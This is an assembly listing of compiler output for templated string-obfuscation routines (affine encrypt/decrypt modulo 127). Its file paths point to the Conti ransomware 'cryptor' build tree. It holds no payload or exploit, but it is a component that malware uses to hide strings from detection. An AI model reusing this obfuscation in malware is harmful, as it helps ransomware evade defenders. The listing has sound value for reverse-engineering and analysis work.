?encrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2e	 add	 r8d, 46			; 0000002eH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 33	 sub	 eax, 51			; 00000033H
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 33	 add	 r8d, 51			; 00000033H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 54 00 00 00	 mov	 ecx, 84			; 00000054H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
